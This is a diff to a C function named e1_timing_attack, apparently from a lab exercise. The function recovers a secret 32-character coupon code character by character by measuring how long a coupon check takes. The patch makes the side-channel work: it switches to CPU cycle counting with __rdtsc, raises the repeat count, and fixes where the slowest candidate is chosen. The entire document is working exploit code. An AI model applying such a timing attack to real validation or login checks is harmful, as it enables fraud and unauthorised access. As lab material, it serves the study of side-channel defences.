@@ -22,45 +22,45 @@ void e1_timing_attack(char* server_ip, int iport, char* library_folder)
 		return;
 	}
 	// 
-	char *alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_+-=!@#$%^&*()~`;:";
-	char coupon[33] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+	char *alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
+	char coupon[33] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
 	bool res = false;
 	int syms_in_alphabet = (int)strlen(alphabet);
-	int *time_diffs = (int*)malloc(sizeof(int)*syms_in_alphabet);
-	int i, j, try_count = 100;
+	uint64_t time_diffs[256];// = (uint64_t*)malloc(sizeof(uint64_t)*syms_in_alphabet);
+	int i, j, try_count = 30*1024;
 	int wrptr = 0;
 	do
 	{
-		memset(time_diffs, 0, sizeof(int)*syms_in_alphabet);
+		memset(time_diffs, 0, sizeof(uint64_t)*256);
 		for (i = 0; i < syms_in_alphabet; i++)
 		{
 			coupon[wrptr] = alphabet[i];
 			for (j = 0; j < try_count; j++)
 			{
-				time_t start, end;
-				time(&start);
+				uint64_t start, end;
+				start = __rdtsc();
 				res = apply_coupon(coupon);
-				time(&end);
+				end = __rdtsc();
 				if (res)
 				{
 					printf("\nRecovered coupon: %s", coupon);
 					return;
 				}
-				time_diffs[i] += (int)(end - start);
+				time_diffs[i] += (uint64_t)(end - start);
 			}
-			int max_diff = 0;
-			int recovered_index = 0;
-			for (j = 0; j < syms_in_alphabet; j++)
-			{
-				if (time_diffs[j] > max_diff)
-				{
-					max_diff = time_diffs[j];
-					recovered_index = j;
-				}
-			}
-			coupon[wrptr] = alphabet[recovered_index];
-			wrptr++;
 		}
+		uint64_t max_diff = 0;
+		int recovered_index = 0;
+		for (j = 0; j < syms_in_alphabet; j++)
+		{
+			if (time_diffs[j] > max_diff)
+			{
+				max_diff = time_diffs[j];
+				recovered_index = j;
+			}
+		}
+		coupon[wrptr] = alphabet[recovered_index];
+		wrptr++;
 	} while (!res && wrptr < 32);
 
 	if (!res || wrptr >= 32)
